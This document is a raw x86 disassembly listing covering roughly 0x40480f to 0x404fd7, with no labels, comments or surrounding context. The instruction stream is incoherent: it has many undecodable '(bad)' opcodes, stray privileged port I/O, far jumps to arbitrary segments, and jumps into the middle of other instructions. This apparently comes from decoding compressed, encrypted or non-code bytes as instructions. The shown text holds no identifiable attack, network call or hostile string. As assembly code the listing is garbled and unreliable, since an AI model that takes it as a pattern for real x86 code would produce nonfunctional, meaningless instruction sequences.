  40480f:	jl     0x404846
  404811:	mov    ds:0xf7e2471e,al
  404816:	jmp    0x404846
  404818:	mov    DWORD PTR [ecx-0x36],0x8d479074
  40481f:	or     al,0x14
  404821:	and    esi,DWORD PTR [ebx-0x37]
  404824:	pop    esp
  404825:	pop    ebx
  404826:	repz jnp 0x4047fb
  404829:	xchg   DWORD PTR [edx],esi
  40482b:	pop    ss
  40482c:	cwde   
  40482d:	aad    0xa4
  40482f:	(bad)  
  404830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404831:	push   eax
  404832:	adc    DWORD PTR [ebx-0x6a],eax
  404835:	mov    DWORD PTR [edi],ebp
  404837:	int    0xee
  404839:	(bad)  
  40483a:	xor    eax,0x18b2619f
  40483f:	mov    cl,0x1a
  404841:	stos   DWORD PTR es:[edi],eax
  404842:	sbb    eax,0x5cebd4ba
  404847:	test   eax,0xb05aef9f
  40484c:	cs out 0xc9,eax
  40484f:	bound  ecx,QWORD PTR [edi]
  404851:	sub    cl,bh
  404853:	inc    ebp
  404854:	cli    
  404855:	pop    ebx
  404856:	mov    ds:0x4a69fb25,al
  40485b:	inc    eax
  40485c:	or     eax,0x817ad537
  404861:	rcl    BYTE PTR [ebx-0x75217542],1
  404867:	out    dx,al
  404868:	cmp    edi,DWORD PTR [esi-0x585688e9]
  40486e:	dec    esp
  40486f:	xor    DWORD PTR [ebx-0x62],edi
  404872:	jo     0x4048d9
  404874:	mov    bh,0x32
  404876:	jmp    0x4048ee
  404878:	mov    bl,0xc6
  40487a:	fwait
  40487b:	jno    0x40481b
  40487d:	dec    ebp
  40487e:	sbb    eax,0xf66bee29
  404883:	es pop ebx
  404885:	cmp    BYTE PTR [ebp+0x1a43f466],0xa9
  40488c:	scas   al,BYTE PTR es:[edi]
  40488d:	dec    edx
  40488e:	pop    es
  40488f:	call   0x75ae:0x1d588470
  404896:	cld    
  404897:	inc    ebx
  404898:	inc    DWORD PTR [ebp-0x5cbd5d55]
  40489e:	das    
  40489f:	and    al,0x86
  4048a1:	mov    ebp,DWORD PTR [eax+eiz*2+0x4f1a0339]
  4048a8:	mov    edi,0x43afa879
  4048ad:	push   esi
  4048ae:	rcr    BYTE PTR [esi],0x67
  4048b1:	jbe    0x40491f
  4048b3:	sbb    ebp,DWORD PTR [esi+0x3750bd83]
  4048b9:	fist   DWORD PTR [ecx+0x74817ae0]
  4048bf:	hlt    
  4048c0:	leave  
  4048c1:	retf   
  4048c2:	dec    esi
  4048c3:	lods   al,BYTE PTR ds:[esi]
  4048c4:	out    0xfd,al
  4048c6:	jp     0x40493c
  4048c8:	mov    ebp,0xab2125c1
  4048cd:	data16 add dh,BYTE PTR [ecx-0x52ad397b]
  4048d4:	mov    ecx,0x60fff062
  4048d9:	jmp    0x2896:0xd77e973f
  4048e0:	les    eax,FWORD PTR [edx-0x235b0a9c]
  4048e6:	and    BYTE PTR [eax],bh
  4048e8:	push   edx
  4048e9:	adc    bl,cl
  4048eb:	into   
  4048ec:	or     eax,0xc8fd8f3e
  4048f1:	xor    al,0x97
  4048f3:	pop    edi
  4048f4:	mov    bl,al
  4048f6:	add    eax,0xece49133
  4048fb:	fdivr  QWORD PTR [eax]
  4048fd:	push   esp
  4048fe:	pop    esi
  4048ff:	loop   0x4048ac
  404901:	mov    ebp,?
  404903:	pushf  
  404904:	stos   DWORD PTR es:[edi],eax
  404905:	mov    dl,0xe2
  404907:	xchg   edx,eax
  404908:	jmp    0xdcc94e76
  40490d:	push   edi
  40490e:	xchg   ebp,eax
  40490f:	sub    eax,0x3cc8ac79
  404914:	lahf   
  404915:	dec    edx
  404916:	mov    edx,0x5eb49196
  40491b:	repnz or al,0x49
  40491e:	popa   
  40491f:	cmp    dh,BYTE PTR [esi]
  404921:	mov    al,0xf4
  404923:	jo     0x4048ed
  404925:	pop    ebx
  404926:	mov    edx,0xe03d0e63
  40492b:	inc    esi
  40492c:	lods   eax,DWORD PTR ds:[esi]
  40492d:	xor    esp,edx
  40492f:	mov    esp,DWORD PTR [esi]
  404931:	inc    eax
  404932:	repz (bad) 
  404934:	(bad)  
  404935:	les    esi,FWORD PTR [edx-0x78]
  404938:	repz sbb eax,0x85df4612
  40493e:	add    BYTE PTR [bx-0x2f],ah
  404942:	test   DWORD PTR [esi+0x4ddc484a],0x71763f3c
  40494c:	dec    ebp
  40494d:	outs   dx,DWORD PTR ds:[esi]
  40494e:	push   esi
  40494f:	mov    dl,0x5e
  404951:	sbb    DWORD PTR [ecx],ebp
  404953:	mov    ds:0xd0d7eead,eax
  404958:	cmp    cl,bl
  40495a:	inc    esp
  40495b:	dec    edx
  40495c:	mov    ds:0xc3560f38,al
  404961:	pause  
  404963:	inc    esp
  404964:	in     eax,dx
  404965:	mov    cl,0xdb
  404967:	mov    esi,0x26865194
  40496c:	jne    0x404959
  40496e:	sub    DWORD PTR ds:0x198a477c,esp
  404974:	sbb    eax,DWORD PTR [eax-0x74]
  404977:	fwait
  404978:	pop    edx
  404979:	mov    DWORD PTR [esp+ebp*2-0x3becba5e],ebx
  404980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404981:	sbb    al,0x83
  404983:	fadd   QWORD PTR [esi]
  404985:	xlat   BYTE PTR ds:[ebx]
  404986:	mov    ?,WORD PTR [ebp-0x7b4023b7]
  40498c:	mov    ecx,0x49f0a5fc
  404991:	push   edx
  404992:	mov    dl,0x41
  404994:	pop    ebp
  404995:	cld    
  404996:	mov    edi,0x337fa8eb
  40499b:	add    eax,0xee422be7
  4049a0:	pusha  
  4049a1:	and    eax,0x3aae44dd
  4049a6:	xchg   edi,eax
  4049a7:	xor    al,0x4
  4049a9:	xchg   DWORD PTR [edi+0x75],esi
  4049ac:	and    bh,cl
  4049ae:	(bad)  
  4049af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b0:	jae    0x4049b5
  4049b2:	bound  ecx,QWORD PTR [ecx-0x54249f50]
  4049b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b9:	push   0x3e
  4049bb:	pop    es
  4049bc:	mov    ds:0x577cfdb6,al
  4049c1:	xor    edi,DWORD PTR [edi+0x3080a03e]
  4049c7:	out    dx,al
  4049c8:	pop    esp
  4049c9:	or     dl,0xdf
  4049cc:	stos   DWORD PTR es:[edi],eax
  4049cd:	inc    edx
  4049ce:	dec    esi
  4049cf:	aam    0xa8
  4049d1:	xor    esi,ebx
  4049d3:	enter  0x20b6,0x49
  4049d7:	jne    0x4049f2
  4049d9:	dec    edi
  4049da:	lahf   
  4049db:	cli    
  4049dc:	fld    TBYTE PTR [ecx+0x44d7d594]
  4049e2:	and    eax,0x420975a3
  4049e7:	pop    ss
  4049e8:	lahf   
  4049e9:	sti    
  4049ea:	and    al,0xc3
  4049ec:	or     DWORD PTR [ebp+0x2f],esp
  4049ef:	out    0xdb,al
  4049f1:	cmp    DWORD PTR [edi+0x2fea474c],edx
  4049f7:	mov    eax,ds:0xbb9bdeed
  4049fc:	mov    cl,0x90
  4049fe:	xor    dl,bh
  404a00:	fcom   DWORD PTR [esi-0x1f4e7b4e]
  404a06:	or     BYTE PTR [esi],ch
  404a08:	dec    BYTE PTR ds:0xc65581b7
  404a0e:	ret    0x518f
  404a11:	or     al,0xc7
  404a13:	int3   
  404a14:	imul   DWORD PTR [esi-0x78dcc314]
  404a1a:	out    0x92,eax
  404a1c:	jp     0x404a68
  404a1e:	push   ebx
  404a1f:	popf   
  404a20:	iret   
  404a21:	mov    WORD PTR [ecx+0x24],es
  404a24:	jbe    0x404a02
  404a26:	sbb    BYTE PTR [edx+0x26],bh
  404a29:	cmp    DWORD PTR [edi+eiz*1+0x27],ebx
  404a2d:	jae    0x4049fc
  404a2f:	mov    cs,WORD PTR [edi]
  404a31:	jle    0x404a0f
  404a33:	mov    ebx,0xe24b9a61
  404a38:	jle    0x404a0d
  404a3a:	inc    edi
  404a3b:	inc    ebp
  404a3c:	xor    eax,0xac538f97
  404a41:	lock xchg BYTE PTR [ebx],cl
  404a44:	push   ecx
  404a45:	in     eax,dx
  404a46:	dec    edx
  404a47:	in     al,0xf5
  404a49:	pop    ss
  404a4a:	jmp    0xe1a2:0x16408ba9
  404a51:	push   ebx
  404a52:	sub    al,0x40
  404a54:	xor    ebp,edi
  404a56:	shr    BYTE PTR [edx],0x6c
  404a59:	bnd call 0x87bd5211
  404a5f:	lods   eax,DWORD PTR ds:[esi]
  404a60:	or     bl,BYTE PTR [ebp-0x6c]
  404a63:	or     al,0x60
  404a65:	ret    0x923e
  404a68:	and    ebp,esp
  404a6a:	sti    
  404a6b:	nop
  404a6c:	dec    ebx
  404a6d:	int    0x8d
  404a6f:	fst    DWORD PTR [edi]
  404a71:	(bad)  
  404a72:	sbb    al,0x59
  404a74:	dec    ecx
  404a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a76:	and    eax,0x1c40f916
  404a7b:	(bad)  
  404a7c:	imul   esi,edi,0xb1d605e0
  404a82:	icebp  
  404a83:	ins    BYTE PTR es:[edi],dx
  404a84:	leave  
  404a85:	rcl    BYTE PTR [edx],cl
  404a87:	sbb    eax,0xb39c428a
  404a8c:	clc    
  404a8d:	call   DWORD PTR [edi]
  404a8f:	mov    bh,0x38
  404a91:	fisubr WORD PTR ds:0x8eb3df2
  404a97:	xchg   ecx,eax
  404a98:	jmp    edi
  404a9a:	lods   al,BYTE PTR ds:[esi]
  404a9b:	loope  0x404a7a
  404a9d:	(bad)  
  404a9e:	push   ebp
  404a9f:	sbb    al,0xab
  404aa1:	leave  
  404aa2:	call   0xbb37:0xf1191dd4
  404aa9:	cdq    
  404aaa:	mov    bl,BYTE PTR [ecx+0x65]
  404aad:	(bad)  
  404aae:	sahf   
  404aaf:	and    ecx,edi
  404ab1:	je     0x404a6d
  404ab3:	cmp    ecx,DWORD PTR [edx-0x53]
  404ab6:	out    0x6,eax
  404ab8:	xchg   BYTE PTR [esi+0x280dad1f],ah
  404abe:	mov    cl,ah
  404ac0:	sub    eax,0xf741818b
  404ac5:	push   ss
  404ac6:	aaa    
  404ac7:	sub    esi,ebp
  404ac9:	test   cl,al
  404acb:	lock xor eax,0xd0edad7
  404ad1:	add    al,0x6e
  404ad3:	cld    
  404ad4:	mov    edx,0x3a4f0d2e
  404ad9:	or     eax,0xa66213b
  404ade:	pushf  
  404adf:	xchg   DWORD PTR [edi-0x5ee22d6],esp
  404ae5:	xor    al,BYTE PTR [esi]
  404ae7:	lods   al,BYTE PTR ds:[esi]
  404ae8:	push   edi
  404ae9:	mov    esp,0x45b7bf87
  404aee:	mov    dh,0x40
  404af0:	mov    esp,0x7d4c910f
  404af5:	imul   eax,DWORD PTR [edi+0x420062a6],0x7e807343
  404aff:	mov    ecx,0x506eb7bf
  404b04:	pop    ss
  404b05:	inc    edx
  404b06:	push   cs
  404b07:	fcmove st,st(1)
  404b09:	popf   
  404b0a:	inc    esi
  404b0b:	test   al,0x9c
  404b0d:	push   esi
  404b0e:	mov    ds:0xa352aefa,al
  404b13:	or     eax,0x9ab54381
  404b18:	inc    ebx
  404b19:	inc    esi
  404b1a:	fstp   TBYTE PTR [esi+0x6c8e5b9f]
  404b20:	and    edx,DWORD PTR [eax]
  404b22:	into   
  404b23:	mov    ebp,0xaab728b2
  404b28:	jle    0x404add
  404b2a:	xlat   BYTE PTR ds:[ebx]
  404b2b:	int    0x1b
  404b2d:	enter  0x6fd6,0x92
  404b31:	bound  ebx,QWORD PTR [esi-0x6aa82c95]
  404b37:	pop    ebx
  404b38:	add    eax,0xf5f63b7b
  404b3d:	and    bl,BYTE PTR [ebx-0x27]
  404b40:	scas   al,BYTE PTR es:[edi]
  404b41:	jne    0x404af9
  404b43:	and    DWORD PTR [edi+eiz*4+0x28132e8d],ebp
  404b4a:	data16 mov ch,cl
  404b4d:	or     eax,0xa67c450c
  404b52:	add    dh,bl
  404b54:	jb     0x404b81
  404b56:	(bad)  
  404b57:	push   edx
  404b58:	push   esp
  404b59:	adc    BYTE PTR [ebx],0xc4
  404b5c:	aam    0x23
  404b5e:	repz dec eax
  404b60:	sbb    eax,DWORD PTR [edx+0x18e4dc74]
  404b66:	jle    0x404bc6
  404b68:	lods   eax,DWORD PTR ds:[esi]
  404b69:	rcr    DWORD PTR [edx],1
  404b6b:	inc    ebx
  404b6c:	jne    0x404b0a
  404b6e:	addr16 dec edx
  404b70:	outs   dx,BYTE PTR ds:[esi]
  404b71:	inc    ecx
  404b72:	mov    dh,0x1f
  404b74:	inc    esi
  404b75:	ins    DWORD PTR es:[edi],dx
  404b76:	fs jmp 0x404bcc
  404b79:	mov    al,0x75
  404b7b:	hlt    
  404b7c:	repnz call 0x6923:0x4c2963bb
  404b84:	add    al,0x40
  404b86:	and    eax,DWORD PTR [ecx]
  404b88:	push   esp
  404b89:	or     DWORD PTR [esi-0x18eebff0],edx
  404b8f:	mov    esi,DWORD PTR [esi+ebx*2-0x2db1f104]
  404b96:	pusha  
  404b97:	retf   
  404b98:	mov    edi,0xca0a06d
  404b9d:	pop    ebp
  404b9e:	imul   edi
  404ba0:	inc    ebp
  404ba1:	mov    ebp,0x67b0ffc4
  404ba6:	and    ecx,edx
  404ba8:	das    
  404ba9:	call   0x1bd71e75
  404bae:	fidiv  DWORD PTR [edi]
  404bb0:	jns    0x404b99
  404bb2:	add    al,0xe9
  404bb4:	into   
  404bb5:	das    
  404bb6:	inc    edi
  404bb7:	and    eax,0x7ccc7541
  404bbc:	rol    BYTE PTR [edi+0x616324fe],1
  404bc2:	jno    0x404bbc
  404bc4:	out    0x7a,eax
  404bc6:	sbb    cl,BYTE PTR [edx-0x7454f0e9]
  404bcc:	push   0x3f7fcf5
  404bd1:	pop    ebp
  404bd2:	cdq    
  404bd3:	and    eax,0x84609deb
  404bd8:	scas   eax,DWORD PTR es:[edi]
  404bd9:	pop    ds
  404bda:	sbb    esp,esp
  404bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bdd:	out    0x27,al
  404bdf:	adc    bh,BYTE PTR [edx+0x69a470a5]
  404be5:	or     bh,BYTE PTR [esi]
  404be7:	popf   
  404be8:	int3   
  404be9:	mov    eax,0xd64d34fd
  404bee:	pushf  
  404bef:	jle    0x404c5e
  404bf1:	sub    BYTE PTR [edx],0x80
  404bf4:	ret    0xa831
  404bf7:	xor    cl,BYTE PTR [edi]
  404bf9:	xchg   edi,eax
  404bfa:	and    bl,ch
  404bfc:	xor    eax,0xdd761fd8
  404c01:	mul    BYTE PTR [ecx-0x11]
  404c04:	jne    0x404c40
  404c06:	pop    eax
  404c07:	or     DWORD PTR [edi],esp
  404c09:	ss pop edi
  404c0b:	ins    BYTE PTR es:[edi],dx
  404c0c:	fimul  WORD PTR [edx]
  404c0e:	jl     0x404c14
  404c10:	(bad)  
  404c11:	repnz inc ebp
  404c13:	add    DWORD PTR [esi+edx*8+0x53],esp
  404c17:	jg     0x404c5f
  404c19:	in     al,dx
  404c1a:	xor    DWORD PTR [ecx+0x70],eax
  404c1d:	and    ch,BYTE PTR [ebp-0x3d93e2b9]
  404c23:	inc    edx
  404c24:	fs xchg ebp,eax
  404c26:	sbb    BYTE PTR [ecx-0x20572d14],ah
  404c2c:	outs   dx,DWORD PTR ds:[esi]
  404c2d:	dec    edx
  404c2f:	pop    edx
  404c30:	jnp    0x404c18
  404c32:	add    bh,0xaf
  404c35:	and    DWORD PTR [esi],esp
  404c37:	mov    esp,0x458aa29f
  404c3c:	push   es
  404c3d:	dec    edi
  404c3e:	les    edx,FWORD PTR [ecx-0x319e31a1]
  404c44:	mov    dl,0x13
  404c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c47:	inc    edi
  404c48:	rcr    DWORD PTR [ebx+0x569e44ef],cl
  404c4e:	jo     0x404bdd
  404c50:	cld    
  404c51:	adc    BYTE PTR [edi-0x206aef0f],al
  404c57:	std    
  404c58:	push   ebx
  404c59:	leave  
  404c5a:	xchg   edx,eax
  404c5b:	adc    BYTE PTR [edi+0x15fab302],dl
  404c61:	or     ebx,esi
  404c63:	and    al,0xbc
  404c65:	sbb    al,0xab
  404c67:	dec    eax
  404c68:	enter  0xb52,0xe3
  404c6c:	cmp    ch,BYTE PTR [esi]
  404c6e:	out    0x9,eax
  404c70:	sub    cl,BYTE PTR [ecx+0x33]
  404c73:	and    BYTE PTR [ebp+ecx*8+0x18],ch
  404c77:	jno    0x404c2b
  404c79:	fcmovne st,st(6)
  404c7b:	sub    BYTE PTR [ebp-0xf9b37a8],0x6d
  404c82:	fstp   TBYTE PTR ds:0x3286b267
  404c88:	dec    edi
  404c89:	mov    edi,0x6bf461ec
  404c8e:	ins    BYTE PTR es:[edi],dx
  404c8f:	push   esi
  404c90:	fild   WORD PTR [ecx+ebx*8-0x1f46250e]
  404c97:	sahf   
  404c98:	sbb    al,0x62
  404c9a:	pop    eax
  404c9b:	out    0x5e,eax
  404c9d:	out    0x3f,eax
  404c9f:	jno    0x404c61
  404ca1:	cmp    al,0x48
  404ca3:	call   0x1ef18b7f
  404ca8:	dec    ecx
  404ca9:	push   0x66
  404cab:	bound  esp,QWORD PTR cs:[edi+0x6740775a]
  404cb2:	int3   
  404cb3:	std    
  404cb4:	push   ebp
  404cb5:	mov    BYTE PTR [edx],ch
  404cb7:	lods   al,BYTE PTR ds:[esi]
  404cb8:	pop    ss
  404cb9:	push   esi
  404cba:	dec    ebp
  404cbb:	fwait
  404cbc:	gs pop eax
  404cbe:	xchg   esp,eax
  404cbf:	jne    0x404cd4
  404cc1:	test   esp,ebp
  404cc3:	lods   al,BYTE PTR ds:[esi]
  404cc4:	out    0xee,al
  404cc6:	jb     0x404c4c
  404cc8:	ins    BYTE PTR es:[edi],dx
  404cc9:	sub    dl,ah
  404ccb:	xchg   edx,edx
  404ccd:	cmp    DWORD PTR [esi+edi*1+0x41b5065f],0xfffffffa
  404cd5:	mov    DWORD PTR [edx+edi*1+0x64],0x136ab0cf
  404cdd:	jecxz  0x404cf9
  404cdf:	fisttp DWORD PTR [edi+edx*8+0x25]
  404ce3:	or     al,0x6f
  404ce5:	cwde   
  404ce6:	mov    DWORD PTR [esi+edi*8],ecx
  404ce9:	mov    eax,0x2c84e9c0
  404cee:	jo     0x404d41
  404cf0:	ja     0x404d63
  404cf2:	xor    ebp,DWORD PTR [ebx+eax*2+0x78fcb7ec]
  404cf9:	mov    BYTE PTR [esi+0x68ba06dd],al
  404cff:	or     DWORD PTR [eax+0x7e69429d],eax
  404d05:	bound  ebp,QWORD PTR [eax-0x2ca8b035]
  404d0b:	inc    edx
  404d0c:	mov    dh,0x8a
  404d0e:	mov    esp,0xb93d96e2
  404d13:	push   esp
  404d14:	(bad)  
  404d15:	in     al,dx
  404d16:	inc    esp
  404d17:	jg     0x404d1d
  404d19:	inc    ebp
  404d1a:	in     al,0x8f
  404d1c:	test   al,0x67
  404d1e:	cmp    DWORD PTR [ebx],esp
  404d20:	repnz int3 
  404d22:	mov    ebx,0x1b34130
  404d27:	aam    0xec
  404d29:	pop    ebp
  404d2a:	outs   dx,BYTE PTR ds:[esi]
  404d2b:	fisttp QWORD PTR [ecx+0x118cbac5]
  404d31:	enter  0x6d94,0x61
  404d35:	xor    BYTE PTR [eax+0x42],ah
  404d38:	mov    dl,0xa
  404d3a:	loop   0x404d1b
  404d3c:	push   edi
  404d3d:	cmp    ebp,DWORD PTR [esi+0x48]
  404d40:	xchg   BYTE PTR [ebp+0x190e5761],bh
  404d46:	mov    bh,0x14
  404d48:	dec    edi
  404d49:	jbe    0x404d8a
  404d4b:	push   esp
  404d4c:	xchg   ebp,eax
  404d4d:	dec    edx
  404d4e:	mov    dh,0x77
  404d51:	mov    ebx,0x6e17a7cf
  404d56:	sub    al,0xa1
  404d58:	pusha  
  404d59:	pextrw ebp,(bad),0xc5
  404d5b:	test   al,0x37
  404d5d:	jmp    0xb6636568
  404d62:	adc    ch,BYTE PTR [edx+0x61]
  404d65:	shl    DWORD PTR [edx+0x6b316173],cl
  404d6b:	lds    edx,FWORD PTR [esi]
  404d6d:	into   
  404d6e:	(bad)  
  404d6f:	cmp    al,0x2d
  404d71:	(bad)  
  404d73:	mov    ah,BYTE PTR [ebx]
  404d75:	sbb    BYTE PTR [eax],0xb0
  404d78:	or     al,0xef
  404d7a:	pop    ebx
  404d7b:	sbb    esi,DWORD PTR [ebp-0x3762dcd6]
  404d81:	rcr    DWORD PTR [edi],1
  404d83:	xchg   esi,eax
  404d84:	jecxz  0x404dd8
  404d86:	xchg   ebx,eax
  404d87:	pop    ss
  404d88:	adc    BYTE PTR [ebx-0x48],dh
  404d8b:	add    ah,BYTE PTR [eax+esi*8]
  404d8e:	push   ebx
  404d8f:	and    al,0xbf
  404d91:	and    edi,DWORD PTR [edi-0x7d]
  404d94:	dec    ebp
  404d95:	push   edi
  404d96:	ret    0xf688
  404d99:	mov    cl,0x56
  404d9b:	mov    edx,0x55e40339
  404da0:	or     BYTE PTR ds:0xf6dd02ad,cl
  404da6:	outs   dx,BYTE PTR ds:[esi]
  404da7:	jmp    0x404e06
  404da9:	ret    
  404daa:	sub    al,0x5f
  404dac:	push   edi
  404dad:	jl     0x404e2d
  404daf:	ret    
  404db0:	xor    dl,BYTE PTR [edi+0x49]
  404db3:	jge    0x404dc8
  404db5:	in     eax,0xbd
  404db7:	shl    DWORD PTR [edx+0x3],1
  404dba:	arpl   WORD PTR [ebx-0x4d],dx
  404dbd:	test   ch,bl
  404dbf:	lea    esi,[ebx-0x6e]
  404dc2:	ret    
  404dc3:	ins    BYTE PTR es:[edi],dx
  404dc4:	sub    eax,0x84b1f94d
  404dc9:	push   esi
  404dca:	cwde   
  404dcb:	dec    esi
  404dcc:	xlat   BYTE PTR ds:[ebx]
  404dcd:	jmp    0x385f:0xd41dc469
  404dd4:	add    eax,0x18442f61
  404dd9:	add    al,0x96
  404ddb:	gs aaa 
  404ddd:	stos   BYTE PTR es:[edi],al
  404dde:	fs push 0x35
  404de1:	loopne 0x404e1a
  404de3:	mov    cs,WORD PTR gs:[esi+ebx*2-0x3856bc40]
  404deb:	add    esp,ecx
  404ded:	dec    ecx
  404dee:	shl    al,1
  404df0:	rcr    DWORD PTR [edi],0xe0
  404df3:	popa   
  404df4:	push   ebx
  404df5:	lahf   
  404df6:	scas   al,BYTE PTR es:[edi]
  404df7:	in     al,0x29
  404df9:	outs   dx,BYTE PTR ds:[esi]
  404dfa:	loope  0x404e71
  404dfc:	shl    DWORD PTR [ecx-0x25482c9d],cl
  404e02:	jne    0x404dae
  404e04:	cmc    
  404e05:	imul   eax,DWORD PTR [esi],0xfffffff0
  404e08:	stos   BYTE PTR es:[edi],al
  404e09:	dec    ebp
  404e0a:	iret   
  404e0b:	push   0xd8e084f5
  404e10:	ret    0xf320
  404e13:	inc    edx
  404e14:	lock mov al,ds:0x7f164726
  404e1a:	sbb    al,0x41
  404e1c:	shl    DWORD PTR [ecx],0x6c
  404e1f:	test   eax,esi
  404e21:	or     ch,dh
  404e23:	outs   dx,DWORD PTR ds:[esi]
  404e24:	dec    edx
  404e25:	adc    ah,BYTE PTR [edx]
  404e27:	mov    DWORD PTR [ebp+0x6c],eax
  404e2a:	(bad)  
  404e2b:	scas   eax,DWORD PTR es:[edi]
  404e2c:	mov    ebp,0x69024d37
  404e31:	adc    eax,0x3bb2d51b
  404e36:	ds sub al,0x9b
  404e39:	iret   
  404e3a:	in     eax,dx
  404e3b:	mov    al,BYTE PTR [esi]
  404e3d:	push   es
  404e3e:	mov    eax,0x46e839de
  404e43:	add    esi,esp
  404e45:	pop    eax
  404e46:	rcl    BYTE PTR [esi],cl
  404e48:	jno    0x404de7
  404e4a:	jnp    0x404e18
  404e4c:	adc    ah,BYTE PTR ds:0xd6db6deb
  404e52:	mov    WORD PTR [ecx],cs
  404e54:	pop    esi
  404e55:	rcr    DWORD PTR [ebp+0x6a],cl
  404e58:	xor    ah,BYTE PTR [esi+0x7cf2e6d0]
  404e5e:	xor    BYTE PTR [eax],ah
  404e60:	xchg   esp,eax
  404e61:	enter  0xd908,0x36
  404e65:	dec    ebx
  404e66:	fdivr  DWORD PTR ds:0x1b358442
  404e6c:	or     bl,BYTE PTR [edx+0x29]
  404e6f:	mov    ah,0x20
  404e71:	(bad)  
  404e72:	mov    esp,0x5bf3aa65
  404e77:	inc    esp
  404e78:	imul   DWORD PTR [edi]
  404e7a:	sub    ebp,0x7bba7471
  404e80:	adc    DWORD PTR [edi+0x1747af7b],ebp
  404e86:	inc    edi
  404e87:	(bad)  
  404e89:	pop    esp
  404e8a:	outs   dx,DWORD PTR ds:[esi]
  404e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e8c:	cli    
  404e8d:	aas    
  404e8e:	jp     0x404ea1
  404e90:	and    ebx,ebp
  404e92:	adc    DWORD PTR [ebp+0x5f],ebp
  404e95:	out    dx,eax
  404e96:	and    ebx,DWORD PTR [edx]
  404e98:	daa    
  404e99:	jge    0x404e5c
  404e9b:	iret   
  404e9c:	outs   dx,BYTE PTR ds:[esi]
  404e9d:	cmc    
  404e9e:	cs aam 0x6d
  404ea1:	push   esi
  404ea2:	arpl   WORD PTR [edx],bx
  404ea4:	or     BYTE PTR [ebx+0x60],0xc6
  404ea8:	push   ds
  404ea9:	mov    esp,0x7e95d993
  404eae:	fwait
  404eaf:	mov    esi,0x9c2a2f73
  404eb4:	push   edi
  404eb5:	jo     0x404f28
  404eb7:	cmp    al,0x18
  404eb9:	xor    al,0xa7
  404ebb:	scas   eax,DWORD PTR es:[edi]
  404ebc:	mov    ecx,DWORD PTR [eax+0x72]
  404ebf:	mov    esp,DWORD PTR [edi-0x47]
  404ec2:	pop    edx
  404ec3:	in     al,dx
  404ec4:	mov    dl,0x72
  404ec6:	xchg   DWORD PTR [edx+esi*8+0x11],eax
  404eca:	sbb    edi,edx
  404ecc:	(bad)  
  404ecd:	rcl    BYTE PTR [ebx*8+0x101ffed4],0xb7
  404ed5:	fstp   TBYTE PTR [eax]
  404ed7:	pop    ebp
  404ed8:	jo     0x404f46
  404eda:	mov    ecx,0x9cfb56e2
  404edf:	les    esp,FWORD PTR [esi+eiz*2-0x2652670e]
  404ee6:	ret    0x83f3
  404ee9:	jbe    0x404f23
  404eeb:	rcl    DWORD PTR ds:0xa510955a,0x38
  404ef2:	cld    
  404ef3:	pop    esi
  404ef4:	jg     0x404f1f
  404ef6:	xchg   ebx,eax
  404ef7:	mov    ebp,0x595ba7de
  404efc:	std    
  404efd:	shr    DWORD PTR [edi],1
  404eff:	mov    WORD PTR [eax+0x22c28dbb],?
  404f05:	cli    
  404f06:	pop    ecx
  404f07:	push   esp
  404f08:	enter  0xce26,0x86
  404f0c:	add    esi,esp
  404f0e:	pop    ecx
  404f0f:	fisttp QWORD PTR ds:0x5a0d1efa
  404f15:	jb     0x404eb3
  404f17:	repz dec edx
  404f19:	adc    al,0x0
  404f1b:	jne    0x404f4f
  404f1d:	xchg   ebx,eax
  404f1e:	dec    eax
  404f1f:	push   ebx
  404f20:	vdivsd xmm5,xmm5,QWORD PTR [edx]
  404f24:	lock xchg DWORD PTR [edi],eax
  404f27:	push   edi
  404f28:	dec    edx
  404f29:	jb     0x404f55
  404f2b:	es daa 
  404f2d:	cmp    DWORD PTR [edx+0x6c],ecx
  404f30:	sub    eax,DWORD PTR [ecx]
  404f32:	mov    edi,ss
  404f34:	sbb    esp,DWORD PTR [ecx+0x2bf91d8e]
  404f3a:	arpl   WORD PTR [ebp+0x9],di
  404f3d:	mov    al,ds:0xf65457e0
  404f42:	and    BYTE PTR [edx-0x63201e6e],bh
  404f48:	cdq    
  404f49:	mov    eax,0x389262f5
  404f4e:	xor    al,0x6e
  404f50:	mov    al,ds:0xfa563995
  404f55:	push   ds
  404f56:	out    0x55,eax
  404f58:	mov    ah,0x70
  404f5a:	idiv   DWORD PTR [edx]
  404f5c:	jle    0x404f1b
  404f5e:	ds push 0x666e791a
  404f64:	xchg   edi,eax
  404f65:	push   ss
  404f66:	and    al,0x6e
  404f68:	sbb    eax,0x5741e1ab
  404f6d:	inc    ecx
  404f6e:	push   ecx
  404f6f:	push   esi
  404f70:	mov    al,0x35
  404f72:	fiadd  DWORD PTR [ebp+edx*2-0x758c9805]
  404f79:	imul   ebx,DWORD PTR [esi+0x6b],0x1f
  404f7d:	jns    0x404fe2
  404f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f80:	jecxz  0x404f96
  404f82:	xlat   BYTE PTR es:[ebx]
  404f84:	xchg   ebp,eax
  404f85:	dec    edx
  404f86:	xchg   ecx,eax
  404f87:	push   esp
  404f88:	retf   0x2152
  404f8b:	mov    eax,DWORD PTR [ecx+edi*4-0x1c736501]
  404f92:	xor    dl,0xdc
  404f95:	rcl    BYTE PTR [edx+ebp*1-0x139c9c48],cl
  404f9c:	adc    al,0x4
  404f9e:	adc    eax,0xba175a68
  404fa3:	pop    ebp
  404fa4:	shl    DWORD PTR [edi+0x9],0xc4
  404fa8:	aad    0xec
  404faa:	dec    ebx
  404fab:	mov    ch,0x71
  404fad:	outs   dx,DWORD PTR ds:[esi]
  404fae:	xor    ch,dh
  404fb0:	xor    DWORD PTR ds:0x79041890,0x57482417
  404fba:	jecxz  0x404f8c
  404fbc:	rcr    bl,0x5
  404fbf:	adc    BYTE PTR [edi-0x7a],dl
  404fc2:	xor    bh,BYTE PTR [esi]
  404fc4:	adc    al,0x65
  404fc6:	clc    
  404fc7:	and    DWORD PTR [ebx+0x413e2176],ebp
  404fcd:	jg     0x404fe3
  404fcf:	mov    ds:0x1fe872f5,eax
  404fd4:	xor    BYTE PTR [ebx+eiz*2],al
  404fd7:	out    0x79,eax
